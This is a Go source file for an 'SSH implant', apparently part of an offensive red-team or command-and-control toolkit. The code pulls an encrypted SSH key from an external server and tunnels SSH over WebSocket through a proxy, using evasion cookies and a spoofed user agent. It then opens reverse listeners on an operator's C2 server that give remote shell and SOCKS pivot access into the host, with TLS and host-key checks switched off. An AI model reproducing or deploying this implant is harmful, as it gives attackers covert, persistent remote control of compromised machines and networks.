/*
	SSH implant
*/

package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

func main() {

	runtime.GOMAXPROCS(runtime.NumCPU())

	// Fetch SSH private key from external server
	// TODO: Implement backoff: https://github.com/jpillora/backoff
	resp, err := http.Get(SSHServerUserKeyUrl)
	if err != nil {
		log.Println("Key Server not accessible")
		os.Exit(1)
	}
	defer resp.Body.Close()

	eKeyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println("Key Server response not understood")
		os.Exit(2) // TODO: Should not exit, instead try to remediate within backoff
	}

	// Decryption involves a shared transmission key (not the SSH privatekey passphrase)
	// TODO: should we do a private key passphrase instead?
	key := KeyDecrypt(eKeyBytes, SSHServerUserKeyPassphrase)

	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		// TODO: attempt to remedy with brckoff
		log.Fatalf("Unable to parse private key: %v", err)
	}

	// Setup authentication with the private key
	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: SSHServerUser,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},

		// TODO: Improve with option to validating a static Host key
		// HostKeyCallback: ssh.FixedHostKey(hostKey),
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Client side:
	// <-> Likely where websocket base network is plugged in

	// TODO: improve by giving option to validate instead of InsecureSkipVerify
	tlsClient := tls.Config{InsecureSkipVerify: true}
	d := websocket.Dialer{
		//ReadBufferSize:  1024,
		//WriteBufferSize: 1024,
		HandshakeTimeout: 45 * time.Second,
		Subprotocols:     []string{},
		TLSClientConfig:  &tlsClient,
	}
	// Dialer options. Experimental, set by flag
	d.EnableCompression = true

	// TODO: Introduce logic if proxy is used.
	// TODO: Introduce proxy options:
	// a. `http.ProxyFromEnvironment`
	// b. build the websocket dialer with proxy information like credentials:
	/*
		proxyURL, _ := url.Parse("http://proxy-ip:proxy-port")
		proxyURL.User = url.UserPassword("proxy-username", "proxy-password")

		dialer := websocket.Dialer{
			Proxy: http.ProxyURL(proxyURL),
		}


		Proxy: http.ProxyURL(&url.URL{
		  Scheme: "http", // or "https" depending on your proxy
		  Host: "ipaddress:port" ,
		  Path: "/",
		}
	*/
	httpProxyURL, err := url.Parse(HTTPProxy)
	if err != nil {
		log.Fatal(err)
	}

	// CONNECT proxy
	// TODO: Reference rework of proxy, build dynamically from options

	// Override:
	// Proxy specifies a function to return a proxy for a given
	// Request. If the function returns a non-nil error, the
	// request is aborted with the provided error.
	// If Proxy is nil or returns a nil *URL, no proxy is used.
	d.Proxy = func(*http.Request) (*url.URL, error) {
		return httpProxyURL, nil
	}

	/* HTTP endpoint */
	// TODO: Improve logic to differentiate WSS/WS
	httpEndpoint, err := url.Parse(HTTPEndpoint)
	if err != nil {
		log.Fatal(err)
	}

	// Evasion by initial HTTP Traffic flexibility. Profiles.
	// TODO: Refactor HTTP Evasion
	// cookies
	jar, _ := cookiejar.New(nil)
	d.Jar = jar
	cookies := []*http.Cookie{{Name: "gorilla", Value: "ws", Path: "/"}}
	d.Jar.SetCookies(httpEndpoint, cookies)

	// Setup wss evasion params
	// TODO: Research how this can be used
	data := url.Values{}
	data.Add("name", "foo")
	data.Add("surname", "bar")
	/* End HTTP Endpoint */

	// Setup Queries (randomize /stream resource)
	// TODO: Why data is not seen?
	wssReqURL := WSEndpoint
	wssReq, _ := http.NewRequest("GET", wssReqURL, strings.NewReader(data.Encode()))
	wssReq.Form = data

	// Setup headers
	wssReq.Header.Set("User-Agent", "Mozilla")

	// TODO: test auth: https://github.com/gorilla/websocket/blob/master/client_server_test.go
	wsConn, resp, err := d.Dial(wssReqURL, wssReq.Header)

	// TODO: Backoff?
	if err != nil {
		log.Printf("WS-Dial INTO remote server error: %s", err)
		if err == websocket.ErrBadHandshake {
			log.Printf("Response Status: %s", resp.Status)
			log.Fatalln(fmt.Printf("handshake failed with status %d\n", resp.StatusCode))
		}
	}

	// Implant side
	// Wrap SSH into WS
	conn := NewWebSocketConn(wsConn)

	sshConn, chans, reqs, err := ssh.NewClientConn(
		conn, SSHServerHost+":"+SSHServerPort, sshConfig)
	serverConn := ssh.NewClient(sshConn, chans, reqs)

	/* This is not needed as we are armorizing the tunnel
	serverConn, err = ssh.Dial("tcp", serverEndpoint.String(), sshConfig)
	*/

	// Server (C2) side:
	// Listen on remote server port - SSH Shell, command, Subsystems
	listener, err := serverConn.Listen("tcp", SSHRemoteEndpoint.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Server (C2) side:
	// Listen on remote server port - SOCKS
	listenerS, err := serverConn.Listen("tcp", SSHRemoteEndpointSOCKS.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Server (C2) side:
	// Setup reverse SSH client authentication
	config := &ssh.ServerConfig{
		// Provide an additional level of protection for remote SSH shell
		// Operators have to provide a password to connect to the SSH implant tunnel randezvous
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if c.User() == SSHRemoteCmdUser && string(pass) == SSHRemoteCmdPwd {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
		// TODO: Implement Key-based auth for the operators
		// See: https://go.googlesource.com/crypto/+/master/ssh/client_auth_test.go
	}

	// use the same private key to come back to the implant
	config.AddHostKey(signer)

	// accept SOCKS listener
	go acceptSLoop(listenerS)
	// accept SSH shell
	acceptLoop(listener, config)

}

// In order to comply websocket to net.Conn interface it needs to implement Read/Write
// TODO: Refactor
func NewWebSocketConn(websocketConn *websocket.Conn) net.Conn {
	c := wsConn{
		Conn: websocketConn,
	}
	return &c
}

//Read is not threadsafe though thats okay since there
//should never be more than one reader
func (c *wsConn) Read(dst []byte) (int, error) {
	ldst := len(dst)
	//use buffer or read new message
	var src []byte
	if l := len(c.buff); l > 0 {
		src = c.buff
		c.buff = nil
	} else {
		t, msg, err := c.Conn.ReadMessage()
		if err != nil {
			return 0, err
		} else if t != websocket.BinaryMessage {
			log.Printf("<WARNING> non-binary msg")
		}
		src = msg
	}
	//copy src->dest
	var n int
	if len(src) > ldst {
		//copy as much as possible of src into dst
		n = copy(dst, src[:ldst])
		//copy remainder into buffer
		r := src[ldst:]
		lr := len(r)
		c.buff = make([]byte, lr)
		copy(c.buff, r)
	} else {
		//copy all of src into dst
		n = copy(dst, src)
	}
	//return bytes copied
	return n, nil
}

func (c *wsConn) Write(b []byte) (int, error) {
	if err := c.Conn.WriteMessage(websocket.BinaryMessage, b); err != nil {
		return 0, err
	}
	n := len(b)
	return n, nil
}

func (c *wsConn) SetDeadline(t time.Time) error {
	if err := c.Conn.SetReadDeadline(t); err != nil {
		return err
	}
	return c.Conn.SetWriteDeadline(t)
}
